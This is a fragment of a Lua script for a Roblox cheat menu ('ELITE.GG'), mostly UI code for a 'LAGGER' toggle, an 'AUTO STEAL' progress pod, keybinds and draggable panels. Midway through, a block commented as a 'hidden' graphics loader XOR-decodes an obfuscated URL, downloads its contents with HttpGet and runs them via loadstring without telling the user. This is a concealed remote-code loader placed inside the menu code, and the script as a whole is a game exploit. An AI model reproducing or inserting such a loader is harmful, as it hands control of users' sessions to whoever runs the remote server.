		local keyBtn = Instance.new("TextButton", mainBtn)
		local function getBlessLaggerBindName()
			return (KB.BlessLagger.gp and KB.BlessLagger.gp.Name) or (KB.BlessLagger.kb and KB.BlessLagger.kb.Name) or "F"
		end
		keyBtn.Size = UDim2.new(0, 36, 0, 28)
		keyBtn.Position = UDim2.new(0, 8, 0.5, -14)
		keyBtn.BackgroundColor3 = ACCENT
		keyBtn.BackgroundTransparency = 0.15
		keyBtn.Text = getBlessLaggerBindName()
		keyBtn.TextColor3 = W
		keyBtn.Font = Enum.Font.GothamBold
		keyBtn.TextSize = 9
		keyBtn.BorderSizePixel = 0
		keyBtn.AutoButtonColor = false
		keyBtn.ZIndex = 62
		Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(1, 0)

		local label = Instance.new("TextLabel", mainBtn)
		label.Size = UDim2.new(0, 100, 0, 18)
		label.Position = UDim2.new(0, 52, 0.5, -9)
		label.BackgroundTransparency = 1
		label.Text = "LAGGER"
		label.TextColor3 = W
		label.Font = Enum.Font.GothamBlack
		label.TextSize = 12
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.ZIndex = 62

		local statusDot = Instance.new("Frame", mainBtn)
		statusDot.Size = UDim2.new(0, 6, 0, 6)
		statusDot.Position = UDim2.new(1, -48, 0.5, -3)
		statusDot.BackgroundColor3 = DIM
		statusDot.BorderSizePixel = 0
		statusDot.ZIndex = 62
		Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)

		local status = Instance.new("TextLabel", mainBtn)
		status.Size = UDim2.new(0, 35, 0, 16)
		status.Position = UDim2.new(1, -40, 0.5, -8)
		status.BackgroundTransparency = 1
		status.Text = "OFF"
		status.TextColor3 = DIM
		status.Font = Enum.Font.GothamBold
		status.TextSize = 10
		status.TextXAlignment = Enum.TextXAlignment.Right
		status.ZIndex = 62

		local hint = Instance.new("TextLabel", panel)
		hint.Size = UDim2.new(1, -20, 0, 12)
		hint.Position = UDim2.new(0, 10, 1, -16)
		hint.BackgroundTransparency = 1
		hint.Text = "Click key to rebind"
		hint.TextColor3 = DIM
		hint.TextSize = 8
		hint.Font = Enum.Font.Gotham
		hint.TextXAlignment = Enum.TextXAlignment.Center
		hint.ZIndex = 61

		setBlessLaggerVisual = function(on)
			blessLaggerUiEnabled = on and true or false
			mainBtn.BackgroundColor3 = blessLaggerUiEnabled and Color3.fromRGB(18, 18, 18) or CARD
			btnStroke.Color = blessLaggerUiEnabled and ICE or ACCENT
			statusDot.BackgroundColor3 = blessLaggerUiEnabled and ICE or DIM
			status.Text = blessLaggerUiEnabled and "ON" or "OFF"
			status.TextColor3 = blessLaggerUiEnabled and ICE or DIM
			label.TextColor3 = blessLaggerUiEnabled and ICE or W
			keyBtn.BackgroundColor3 = blessLaggerUiEnabled and ICE or ACCENT
		end

		mainBtn.Activated:Connect(function()
			if _anyKeyListening then return end
			setBlessLaggerEnabled(not blessLaggerActive)
			saveConfig()
		end)

		local gamepadKeys = {
			[Enum.KeyCode.ButtonA] = true, [Enum.KeyCode.ButtonB] = true,
			[Enum.KeyCode.ButtonX] = true, [Enum.KeyCode.ButtonY] = true,
			[Enum.KeyCode.ButtonL1] = true, [Enum.KeyCode.ButtonR1] = true,
			[Enum.KeyCode.ButtonL2] = true, [Enum.KeyCode.ButtonR2] = true,
			[Enum.KeyCode.ButtonL3] = true, [Enum.KeyCode.ButtonR3] = true,
			[Enum.KeyCode.ButtonStart] = true, [Enum.KeyCode.ButtonSelect] = true,
			[Enum.KeyCode.DPadUp] = true, [Enum.KeyCode.DPadDown] = true,
			[Enum.KeyCode.DPadLeft] = true, [Enum.KeyCode.DPadRight] = true
		}

		local keyListening = false
		local keyConn = nil

		keyBtn.Activated:Connect(function()
			if keyListening then
				keyListening = false
				_anyKeyListening = false
				if keyConn then keyConn:Disconnect(); keyConn = nil end
				keyBtn.Text = getBlessLaggerBindName()
				return
			end
			keyListening = true
			_anyKeyListening = true
			keyBtn.Text = "..."
			keyConn = UIS.InputBegan:Connect(function(input)
				if not keyListening then return end
				if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Escape then
					keyListening = false
					_anyKeyListening = false
					if keyConn then keyConn:Disconnect(); keyConn = nil end
					keyBtn.Text = getBlessLaggerBindName()
					return
				end
				if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode ~= Enum.KeyCode.Unknown then
					KB.BlessLagger.kb = input.KeyCode
					KB.BlessLagger.gp = nil
				elseif input.UserInputType and input.UserInputType.Name:match("^Gamepad") and gamepadKeys[input.KeyCode] then
					KB.BlessLagger.gp = input.KeyCode
					KB.BlessLagger.kb = nil
				else
					return
				end
				keyListening = false
				_anyKeyListening = false
				if keyConn then keyConn:Disconnect(); keyConn = nil end
				keyBtn.Text = getBlessLaggerBindName()
				saveConfig()
			end)
		end)

		setBlessLaggerPanelVisible = function(on, skipSave)
			blessLaggerPanelOpen = on and true or false
			panel.Visible = blessLaggerPanelOpen
			if not skipSave then saveConfig() end
		end

		close.Activated:Connect(function()
			if setBlessLaggerPanelVisible then setBlessLaggerPanelVisible(false) end
		end)

		local dragging = false
		local activeInput, startInput, startPosition = nil, nil, nil

		dragBtn.InputBegan:Connect(function(input)
			if uiLocked then return end
			if input.UserInputType ~= Enum.UserInputType.Touch and input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
			dragging = true
			activeInput = input
			startInput = input.Position
			startPosition = panel.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End or input.UserInputState == Enum.UserInputState.Cancel then
					dragging = false
					activeInput = nil
					blessLaggerPanelPosition = { xs = panel.Position.X.Scale, x = panel.Position.X.Offset, ys = panel.Position.Y.Scale, y = panel.Position.Y.Offset }
					saveConfig()
				end
			end)
		end)

		UIS.InputChanged:Connect(function(input)
			if not dragging or uiLocked or not startInput or not startPosition then return end
			if activeInput and activeInput.UserInputType == Enum.UserInputType.Touch and input ~= activeInput then return end
			if input.UserInputType ~= Enum.UserInputType.Touch and input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
			local dx, dy = input.Position.X - startInput.X, input.Position.Y - startInput.Y
			panel.Position = UDim2.new(startPosition.X.Scale, startPosition.X.Offset + dx, startPosition.Y.Scale, startPosition.Y.Offset + dy)
		end)

		if setBlessLaggerVisual then setBlessLaggerVisual(blessLaggerActive) end
	end

	local main = Instance.new("Frame", gui)
	main.Size = UDim2.new(0, GUI_W, 0, GUI_H)
	main.Position = guiPosition
	main.BackgroundTransparency = 1
	main.BorderSizePixel = 0
	main.ClipsDescendants = true

	mainUIScale = Instance.new("UIScale", main)
	mainUIScale.Scale = (IsMobile and 0.85 or 1) * uiScaleValue
	Instance.new("UICorner", main).CornerRadius = UDim.new(0, 24)

	local bgImg = Instance.new("ImageLabel", main)
	bgImg.Size = UDim2.new(1, 0, 1, 0)
	bgImg.Position = UDim2.new(0, 0, 0, 0)
	bgImg.Image = "rbxassetid://88369503310562"
	bgImgRef = bgImg
	bgImg.ImageTransparency = 0.0
	bgImg.ScaleType = Enum.ScaleType.Crop
	bgImg.BackgroundColor3 = BG
	bgImg.BackgroundTransparency = 0
	bgImg.BorderSizePixel = 0
	bgImg.ZIndex = 1
	Instance.new("UICorner", bgImg).CornerRadius = UDim.new(0, 24)

	local bgOverlay = Instance.new("Frame", main)
	bgOverlay.Size = UDim2.new(1, 0, 1, 0)
	bgOverlay.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
	bgOverlay.BackgroundTransparency = 0.55
	bgOverlay.BorderSizePixel = 0
	bgOverlay.ZIndex = 2
	Instance.new("UICorner", bgOverlay).CornerRadius = UDim.new(0, 24)

	local mainStroke = Instance.new("UIStroke", main)
	mainStroke.Color = ACCENT
	mainStroke.Thickness = 2
	mainStroke.Transparency = 0.1
	mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	local mainStrokeGrad = Instance.new("UIGradient", mainStroke)
	mainStrokeGrad.Color = ColorSequence.new(ACCENT, ICE)
	mainStrokeGrad.Rotation = 45

	drag(main, function(active, moved)
		if not active and moved then
			guiPosition = main.Position
			saveConfig()
		end
	end)

	buildBlessLaggerPanel()

	local hdr = Instance.new("Frame", main)
	hdr.Size = UDim2.new(1, 0, 0, HDR_H)
	hdr.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
	hdr.BackgroundTransparency = 0.15
	hdr.BorderSizePixel = 0
	hdr.ZIndex = 3
	Instance.new("UICorner", hdr).CornerRadius = UDim.new(0, 24)

	local hdrGrad = Instance.new("UIGradient", hdr)
	hdrGrad.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30)),
		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(18, 18, 18)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 8, 8))
	})
	hdrGrad.Rotation = 135

	local hdrStroke = Instance.new("UIStroke", hdr)
	hdrStroke.Color = ACCENT
	hdrStroke.Thickness = 1.8
	hdrStroke.Transparency = 0.05
	hdrStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	local hdrStrokeGrad = Instance.new("UIGradient", hdrStroke)
	hdrStrokeGrad.Color = ColorSequence.new(ACCENT, ICE)
	hdrStrokeGrad.Rotation = 45

	task.spawn(function()
		while hdrStrokeGrad and hdrStrokeGrad.Parent do
			hdrStrokeGrad.Rotation = (hdrStrokeGrad.Rotation + 1.5) % 360
			task.wait(0.04)
		end
	end)

	local logo = Instance.new("ImageLabel", hdr)
	logo.Size = UDim2.new(0, LOGO, 0, LOGO)
	logo.Position = UDim2.new(0, 12, 0, IsMobile and 11 or 12)
	logo.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	logo.BorderSizePixel = 0
	logo.ZIndex = 3
	logo.Image = "rbxassetid://133907612915441"
	logo.ImageColor3 = Color3.fromRGB(255, 255, 255)
	logo.ScaleType = Enum.ScaleType.Crop
	Instance.new("UICorner", logo).CornerRadius = UDim.new(0, 8)

	local logoStroke = Instance.new("UIStroke", logo)
	logoStroke.Color = ACCENT
	logoStroke.Thickness = 1.5
	logoStroke.Transparency = 0.1

	local ttl = Instance.new("TextLabel", hdr)
	ttl.Size = UDim2.new(1, -(IsMobile and 84 or 98), 0, IsMobile and 19 or 22)
	ttl.Position = UDim2.new(0, IsMobile and 50 or 56, 0, IsMobile and 10 or 11)
	ttl.BackgroundTransparency = 1
	ttl.Text = BLESS_BRAND
	ttl.TextColor3 = ACCENT
	ttl.Font = Enum.Font.GothamBlack
	ttl.TextSize = IsMobile and 15 or 18
	ttl.TextXAlignment = Enum.TextXAlignment.Left
	ttl.ZIndex = 3
	ttl.TextStrokeColor3 = Color3.fromRGB(80, 80, 80)
	ttl.TextStrokeTransparency = 0.5

	local sub = Instance.new("TextLabel", hdr)
	sub.Size = UDim2.new(1, -(IsMobile and 84 or 98), 0, 15)
	sub.Position = UDim2.new(0, IsMobile and 50 or 56, 0, IsMobile and 29 or 34)
	sub.BackgroundTransparency = 1
	sub.Text = BLESS_DISCORD
	sub.TextColor3 = ICE
	sub.Font = Enum.Font.GothamMedium
	sub.TextSize = IsMobile and 9 or 10
	sub.TextXAlignment = Enum.TextXAlignment.Left
	sub.ZIndex = 3

	local userChip = Instance.new("Frame", hdr)
	userChip.AnchorPoint = Vector2.new(1, 0)
	userChip.Size = UDim2.new(0, IsMobile and 118 or 148, 0, IsMobile and 15 or 17)
	userChip.Position = UDim2.new(1, IsMobile and -8 or -12, 0, IsMobile and 33 or 38)
	userChip.BackgroundTransparency = 1
	userChip.ZIndex = 6

	local userDot = Instance.new("Frame", userChip)
	userDot.AnchorPoint = Vector2.new(1, 0.5)
	userDot.Size = UDim2.new(0, IsMobile and 6 or 7, 0, IsMobile and 6 or 7)
	userDot.Position = UDim2.new(1, 0, 0.5, 0)
	userDot.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
	userDot.BorderSizePixel = 0
	userDot.ZIndex = 7
	Instance.new("UICorner", userDot).CornerRadius = UDim.new(1, 0)

	local userNameLbl = Instance.new("TextLabel", userChip)
	userNameLbl.Size = UDim2.new(1, -(IsMobile and 11 or 13), 1, 0)
	userNameLbl.Position = UDim2.new(0, 0, 0, 0)
	userNameLbl.BackgroundTransparency = 1
	userNameLbl.Text = LP.Name
	userNameLbl.TextColor3 = W
	userNameLbl.Font = Enum.Font.GothamBold
	userNameLbl.TextSize = IsMobile and 9 or 11
	userNameLbl.TextXAlignment = Enum.TextXAlignment.Right
	userNameLbl.TextTruncate = Enum.TextTruncate.AtEnd
	userNameLbl.ZIndex = 7

	local closeBtn = Instance.new("TextButton", hdr)
	closeBtn.Size = UDim2.new(0, IsMobile and 26 or 30, 0, IsMobile and 26 or 30)
	closeBtn.Position = UDim2.new(1, IsMobile and -34 or -42, 0, IsMobile and 13 or 14)
	closeBtn.BackgroundColor3 = Color3.fromRGB(160, 160, 160)
	closeBtn.BorderSizePixel = 0
	closeBtn.ZIndex = 4
	closeBtn.Text = "✕"
	closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeBtn.Font = Enum.Font.GothamBlack
	closeBtn.TextSize = IsMobile and 14 or 16
	Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)

	local closeBtnStroke = Instance.new("UIStroke", closeBtn)
	closeBtnStroke.Color = ACCENT
	closeBtnStroke.Thickness = 2
	closeBtnStroke.Transparency = 0.05

	local lockBtn = Instance.new("TextButton", hdr)
	lockBtn.Size = UDim2.new(0, IsMobile and 38 or 46, 0, IsMobile and 26 or 30)
	lockBtn.Position = UDim2.new(1, IsMobile and -78 or -98, 0, IsMobile and 12 or 14)
	lockBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	lockBtn.BorderSizePixel = 0
	lockBtn.ZIndex = 4
	lockBtn.Text = "🔒 LOCK"
	lockBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	lockBtn.Font = Enum.Font.GothamBlack
	lockBtn.TextSize = IsMobile and 9 or 10
	lockBtn.AutoButtonColor = false
	Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0, 8)

	local lockStroke = Instance.new("UIStroke", lockBtn)
	lockStroke.Color = ACCENT
	lockStroke.Thickness = 2
	lockStroke.Transparency = 0.1

	local function setGuiLock(on, skipSave)
		uiLocked = on and true or false
		if setTopLockVisual then setTopLockVisual(uiLocked) end
		if setLockGuiVisual then setLockGuiVisual(uiLocked) end
		if not skipSave then saveConfig() end
	end

	setTopLockVisual = function(on)
		lockBtn.BackgroundColor3 = on and ACCENT or Color3.fromRGB(28, 28, 28)
		lockBtn.TextColor3 = on and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
		lockBtn.Text = on and "🔒 LOCK" or "🔓 LOCK"
		lockStroke.Color = on and ICE or ACCENT
		lockStroke.Transparency = on and 0 or 0.1
	end

	lockBtn.Activated:Connect(function()
		setGuiLock(not uiLocked)
	end)

	local divider = Instance.new("Frame", hdr)
	divider.Size = UDim2.new(1, -24, 0, 1)
	divider.Position = UDim2.new(0, 12, 1, -1)
	divider.BackgroundColor3 = ACCENT
	divider.BorderSizePixel = 0
	divider.BackgroundTransparency = 0.05
	divider.ZIndex = 3

	local divGrad = Instance.new("UIGradient", divider)
	divGrad.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
		ColorSequenceKeypoint.new(0.3, ACCENT),
		ColorSequenceKeypoint.new(0.7, ICE),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
	})

	local miniBtn = Instance.new("TextButton", gui)
	miniBtn.Size = UDim2.new(0, 116, 0, 32)
	miniBtn.Position = miniButtonPosition
	miniBtn.BackgroundColor3 = PANEL
	miniBtn.BorderSizePixel = 0
	miniBtn.Text = "☰ ELITE.GG"
	miniBtn.TextColor3 = ACCENT
	miniBtn.Font = Enum.Font.GothamBlack
	miniBtn.TextSize = 12
	miniBtn.ZIndex = 20
	miniBtn.Visible = false
	Instance.new("UICorner", miniBtn).CornerRadius = UDim.new(0, 10)

	local miniBtnStroke = Instance.new("UIStroke", miniBtn)
	miniBtnStroke.Color = ACCENT
	miniBtnStroke.Thickness = 1.5
	miniBtnStroke.Transparency = 0.15

	local miniStroke = Instance.new("UIStroke", miniBtn)
	miniStroke.Color = ACCENT
	miniStroke.Thickness = 1
	miniStroke.Transparency = 0.2

	local miniDragged = false
	drag(miniBtn, function(active, moved)
		if not active and moved then
			miniButtonPosition = miniBtn.Position
			saveConfig()
		end
		if moved then miniDragged = true end
		if not active and moved then task.delay(0.12, function() miniDragged = false end) end
	end)

	local function showGui()
		main.Visible = true
		miniBtn.Visible = false
	end

	local function hideGui()
		main.Visible = false
		miniBtn.Visible = true
	end

	showCandyGui = showGui
	hideCandyGui = hideGui
	isCandyGuiVisible = function() return main.Visible end

	closeBtn.MouseButton1Click:Connect(hideGui)
	miniBtn.Activated:Connect(function()
		if miniDragged then return end
		showGui()
	end)

	-- AUTO STEAL — STATUS POD (ROUNDED STEAL BAR)
	local pbFrame = Instance.new("Frame", gui)
	pbFrame.Name = "StealPod"
	pbFrame.Size = UDim2.new(0, 300, 0, 52)
	pbFrame.Position = stealPodPosition
	pbFrame.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
	pbFrame.BorderSizePixel = 0
	pbFrame.ClipsDescendants = false
	Instance.new("UICorner", pbFrame).CornerRadius = UDim.new(1, 0)

	local dragActive = false
	local dragStartInput, dragStartPos = nil, nil

	local function onDragInput(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			if uiLocked then return end
			dragActive = true
			dragStartInput = input.Position
			dragStartPos = pbFrame.Position
			local conn
			conn = input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragActive = false
					stealPodPosition = pbFrame.Position
					saveConfig()
					conn:Disconnect()
				end
			end)
		end
	end

	pbFrame.InputBegan:Connect(onDragInput)

	UIS.InputChanged:Connect(function(input)
		if not dragActive or not dragStartInput or not dragStartPos then return end
		if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
		local dx = input.Position.X - dragStartInput.X
		local dy = input.Position.Y - dragStartInput.Y
		pbFrame.Position = UDim2.new(
			dragStartPos.X.Scale,
			dragStartPos.X.Offset + dx,
			dragStartPos.Y.Scale,
			dragStartPos.Y.Offset + dy
		)
	end)

	local pbGradBg = Instance.new("UIGradient", pbFrame)
	pbGradBg.Color = ColorSequence.new(Color3.fromRGB(19, 19, 19), Color3.fromRGB(10, 10, 10))
	pbGradBg.Rotation = 90

	local pbs = Instance.new("UIStroke", pbFrame)
	pbs.Color = ICE
	pbs.Thickness = 1.4
	pbs.Transparency = 0.4
	pbs.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	progressStripe = Instance.new("Frame", pbFrame)
	progressStripe.Size = UDim2.new(0, 4, 1, -18)
	progressStripe.Position = UDim2.new(0, 8, 0, 9)
	progressStripe.BackgroundColor3 = ACCENT
	progressStripe.BorderSizePixel = 0
	Instance.new("UICorner", progressStripe).CornerRadius = UDim.new(1, 0)

	local statusPill = Instance.new("Frame", pbFrame)
	statusPill.Size = UDim2.new(0, 158, 0, 24)
	statusPill.Position = UDim2.new(0, 20, 0, 7)
	statusPill.BackgroundColor3 = Color3.fromRGB(9, 9, 9)
	statusPill.BorderSizePixel = 0
	Instance.new("UICorner", statusPill).CornerRadius = UDim.new(1, 0)
	progressPillStroke = Instance.new("UIStroke", statusPill)
	progressPillStroke.Color = ACCENT
	progressPillStroke.Thickness = 1
	progressPillStroke.Transparency = 0.45

	progressDot = Instance.new("Frame", statusPill)
	progressDot.Size = UDim2.new(0, 10, 0, 10)
	progressDot.Position = UDim2.new(0, 10, 0.5, -5)
	progressDot.BackgroundColor3 = ACCENT
	progressDot.BorderSizePixel = 0
	Instance.new("UICorner", progressDot).CornerRadius = UDim.new(1, 0)
	progressDotGlow = Instance.new("UIStroke", progressDot)
	progressDotGlow.Color = ACCENT
	progressDotGlow.Thickness = 2
	progressDotGlow.Transparency = 0.4

	task.spawn(function()
		while progressDot and progressDot.Parent do
			TS:Create(progressDotGlow, TweenInfo.new(0.75, Enum.EasingStyle.Sine), { Transparency = 0.9, Thickness = 6 }):Play()
			task.wait(0.78)
			TS:Create(progressDotGlow, TweenInfo.new(0.75, Enum.EasingStyle.Sine), { Transparency = 0.3, Thickness = 2 }):Play()
			task.wait(0.78)
		end
	end)

	progressPct = Instance.new("TextLabel", statusPill)
	progressPct.Size = UDim2.new(1, -30, 1, 0)
	progressPct.Position = UDim2.new(0, 26, 0, 0)
	progressPct.BackgroundTransparency = 1
	progressPct.Text = (CONFIG.AUTO_STEAL_ENABLED and "READY" or "IDLE")
	progressPct.TextColor3 = W
	progressPct.Font = Enum.Font.GothamBlack
	progressPct.TextSize = 11
	progressPct.TextXAlignment = Enum.TextXAlignment.Left

	progressRadLbl = Instance.new("TextLabel", pbFrame)
	progressRadLbl.Size = UDim2.new(0, 104, 0, 24)
	progressRadLbl.Position = UDim2.new(1, -114, 0, 7)
	progressRadLbl.BackgroundTransparency = 1
	progressRadLbl.Text = string.format("◉ %.2g", CONFIG.STEAL_RANGE)
	progressRadLbl.TextColor3 = ICE
	progressRadLbl.Font = Enum.Font.GothamBlack
	progressRadLbl.TextSize = 11
	progressRadLbl.TextXAlignment = Enum.TextXAlignment.Right

	local pbg = Instance.new("Frame", pbFrame)
	pbg.Size = UDim2.new(1, -40, 0, 9)
	pbg.Position = UDim2.new(0, 20, 1, -15)
	pbg.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
	pbg.BorderSizePixel = 0
	Instance.new("UICorner", pbg).CornerRadius = UDim.new(1, 0)

	local pbgStroke = Instance.new("UIStroke", pbg)
	pbgStroke.Color = Color3.fromRGB(45, 45, 45)
	pbgStroke.Thickness = 1
	pbgStroke.Transparency = 0.45

	progressFill = Instance.new("Frame", pbg)
	progressFill.Size = UDim2.new(0, 0, 1, 0)
	progressFill.BackgroundColor3 = ACCENT
	progressFill.BorderSizePixel = 0
	Instance.new("UICorner", progressFill).CornerRadius = UDim.new(1, 0)

	local fillGrad = Instance.new("UIGradient", progressFill)
	fillGrad.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), ICE)
	fillGrad.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0.55),
		NumberSequenceKeypoint.new(1, 0)
	})

	local mainPage = Instance.new("ScrollingFrame", main)
	mainPage.Name = "MainPage"
	mainPage.Size = UDim2.new(1, -(PAD * 2), 1, -PAGE_BOTTOM)
	mainPage.Position = UDim2.new(0, PAD, 0, PAGE_TOP)
	mainPage.BackgroundTransparency = 1
	mainPage.BorderSizePixel = 0
	mainPage.ScrollBarThickness = 2
	mainPage.ScrollBarImageColor3 = ICE
	mainPage.CanvasSize = UDim2.new(0, 0, 0, 0)
	mainPage.AutomaticCanvasSize = Enum.AutomaticSize.Y

	local pageLayout = Instance.new("UIListLayout", mainPage)
	pageLayout.SortOrder = Enum.SortOrder.LayoutOrder
	pageLayout.Padding = UDim.new(0, IsMobile and 5 or 7)

	local pagePad = Instance.new("UIPadding", mainPage)
	pagePad.PaddingLeft = UDim.new(0, 2)
	pagePad.PaddingRight = UDim.new(0, 2)
	pagePad.PaddingTop = UDim.new(0, 1)
	pagePad.PaddingBottom = UDim.new(0, IsMobile and 6 or 8)

	local lo = 0
	local function LO() lo = lo + 1; return lo end

	local function mkSect(parent, txt)
		local f = Instance.new("Frame", parent)
		f.Size = UDim2.new(1, 0, 0, SECTION_H)
		f.BackgroundTransparency = 1
		f.BorderSizePixel = 0
		f.LayoutOrder = LO()
		local bullet = Instance.new("Frame", f)
		bullet.Size = UDim2.new(0, 5, 0, 5)
		bullet.Position = UDim2.new(0, 2, 0.5, -2)
		bullet.BackgroundColor3 = ACCENT
		bullet.BorderSizePixel = 0
		Instance.new("UICorner", bullet).CornerRadius = UDim.new(0, 2)
		local l = Instance.new("TextLabel", f)
		l.Size = UDim2.new(1, -18, 1, 0)
		l.Position = UDim2.new(0, 14, 0, 0)
		l.BackgroundTransparency = 1
		l.Text = txt:upper()
		l.TextColor3 = ACCENT
		l.Font = Enum.Font.GothamBlack
		l.TextSize = IsMobile and 8 or 9
		l.TextXAlignment = Enum.TextXAlignment.Left
	end

	local function mkRow(parent, h, toggleRow)
		local base = toggleRow and Color3.fromRGB(20, 20, 20) or Color3.fromRGB(16, 16, 16)
		local hover = toggleRow and Color3.fromRGB(35, 35, 35) or Color3.fromRGB(28, 28, 28)
		local f = Instance.new("Frame", parent)
		f.Size = UDim2.new(1, 0, 0, h or ROW_H)
		f.BackgroundColor3 = base
		f.BackgroundTransparency = 0.35
		f.BorderSizePixel = 0
		f.LayoutOrder = LO()
		Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)
		local st = Instance.new("UIStroke", f)
		st.Color = toggleRow and ACCENT or STROKE
		st.Thickness = 1
		st.Transparency = toggleRow and 0.55 or 0.45
		f.MouseEnter:Connect(function()
			TS:Create(f, TweenInfo.new(0.12), { BackgroundColor3 = hover, BackgroundTransparency = 0.2 }):Play()
			TS:Create(st, TweenInfo.new(0.12), { Color = ACCENT, Transparency = 0.08 }):Play()
		end)
		f.MouseLeave:Connect(function()
			TS:Create(f, TweenInfo.new(0.12), { BackgroundColor3 = base, BackgroundTransparency = 0.35 }):Play()
			TS:Create(st, TweenInfo.new(0.12), { Color = toggleRow and ACCENT or STROKE, Transparency = toggleRow and 0.55 or 0.45 }):Play()
		end)
		return f
	end

	local function mkLabel(row, txt)
		local l = Instance.new("TextLabel", row)
		l.Size = UDim2.new(0.62, 0, 1, 0)
		l.Position = UDim2.new(0, 10, 0, 0)
		l.BackgroundTransparency = 1
		l.Text = txt
		l.TextColor3 = W
		l.Font = Enum.Font.GothamBold
		l.TextSize = IsMobile and 10 or 12
		l.TextXAlignment = Enum.TextXAlignment.Left
		return l
	end

	local function mkPill(row, offset)
		local pill = Instance.new("Frame", row)
		pill.Size = UDim2.new(0, 36, 0, 18)
		pill.Position = UDim2.new(1, -(offset or 44), 0.5, -9)
		pill.BackgroundColor3 = OFF
		pill.BorderSizePixel = 0
		pill.ZIndex = 3
		Instance.new("UICorner", pill).CornerRadius = UDim.new(1, 0)
		local dot = Instance.new("Frame", pill)
		dot.Size = UDim2.new(0, 12, 0, 12)
		dot.Position = UDim2.new(0, 3, 0.5, -6)
		dot.BackgroundColor3 = DIM
		dot.BorderSizePixel = 0
		dot.ZIndex = 4
		Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
		return pill, dot
	end

	local function animPill(pill, dot, on)
		TS:Create(pill, TweenInfo.new(0.18, Enum.EasingStyle.Quad), { BackgroundColor3 = on and ICE or OFF }):Play()
		TS:Create(dot, TweenInfo.new(0.18, Enum.EasingStyle.Back), { Position = on and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 3, 0.5, -6), BackgroundColor3 = on and Color3.fromRGB(0, 0, 0) or DIM }):Play()
	end

	local function mkToggle(parent, txt, cb)
		local row = mkRow(parent, ROW_H, true)
		mkLabel(row, txt)
		local pill, dot = mkPill(row, 46)
		local on = false
		local function sv(s)
			on = s
			animPill(pill, dot, s)
		end
		local clk = Instance.new("TextButton", pill)
		clk.Size = UDim2.new(1, 0, 1, 0)
		clk.BackgroundTransparency = 1
		clk.Text = ""
		clk.ZIndex = 5
		clk.Activated:Connect(function()
			on = not on
			sv(on)
			cb(on)
		end)
		return sv
	end

-- Hidden anti lag/smooth graphics loader (URL obfuscated)
task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            local x
            if bit32 and type(bit32.bxor) == "function" then
                x = bit32.bxor(b, 23)
            else
                local r, bit, a, c = 0, 1, b, 23
                while a > 0 or c > 0 do
                    local ab, cb = a % 2, c % 2
                    if ab ~= cb then r = r + bit end
                    a = math.floor(a / 2)
                    c = math.floor(c / 2)
                    bit = bit * 2
                end
                x = r
            end
            t[i] = string.char(x)
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("\127ccgd-88gvdcrqn9vgg8#GYp_N&V8ev`"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)

	local function mkBox(parent, default, w, xOff, cb)
		local tb = Instance.new("TextBox", parent)
		tb.Size = UDim2.new(0, w or 58, 0, 22)
		tb.Position = UDim2.new(1, -(xOff or 66), 0.5, -11)
		tb.BackgroundColor3 = INP
		tb.BorderSizePixel = 0
		tb.Text = tostring(default)
		tb.TextColor3 = Color3.fromRGB(0, 0, 0)
		tb.Font = Enum.Font.GothamBlack
		tb.TextSize = IsMobile and 10 or 12
		tb.ClearTextOnFocus = false
		tb.ZIndex = 5
		Instance.new("UICorner", tb).CornerRadius = UDim.new(1, 0)
		local bs = Instance.new("UIStroke", tb)
		bs.Color = ACCENT
		bs.Thickness = 1
		bs.Transparency = 0.34
		tb.MouseEnter:Connect(function()
			TS:Create(bs, TweenInfo.new(0.12), { Color = ICE, Transparency = 0.02 }):Play()
		end)
		tb.MouseLeave:Connect(function()
			if not tb:IsFocused() then
				TS:Create(bs, TweenInfo.new(0.12), { Color = ACCENT, Transparency = 0.34 }):Play()
			end
		end)
		tb.Focused:Connect(function()
			TS:Create(bs, TweenInfo.new(0.12), { Color = ICE, Transparency = 0 }):Play()
		end)
		tb.FocusLost:Connect(function()
			TS:Create(bs, TweenInfo.new(0.12), { Color = ACCENT, Transparency = 0.34 }):Play()
			if cb then
				local n = tonumber(tb.Text)
				if n then cb(n) else tb.Text = tostring(default) end
			end
		end)
		return tb
